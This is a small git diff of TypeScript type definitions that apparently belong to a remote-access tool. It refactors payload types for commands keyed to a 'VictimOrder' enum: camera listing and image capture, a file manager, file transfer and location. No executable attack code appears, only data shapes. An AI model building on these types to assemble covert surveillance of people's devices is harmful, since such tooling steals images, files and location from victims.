@@ -1,10 +1,16 @@
 import { type VictimOrder } from '../enums/VictimOrder';
 
+export interface CameraItem {
+    name: string;
+    id: number;
+}
+
 export type CameraOrderPayload =
-    | { camList: true; list: Array<{ name: string; id: number }> }
+    | { image: undefined; buffer: undefined; camList: true; list: CameraItem[] }
     | {
+          camList: undefined;
           image: true;
-          buffer: Buffer;
+          buffer: ArrayBuffer;
       };
 
 export type FileManagerPayload =
@@ -18,7 +24,7 @@ export type FileManagerPayload =
 export interface FilePayload {
     file: true;
     name: string;
-    buffer: Buffer;
+    buffer: ArrayBuffer;
 }
 
 export interface LocationPayload {
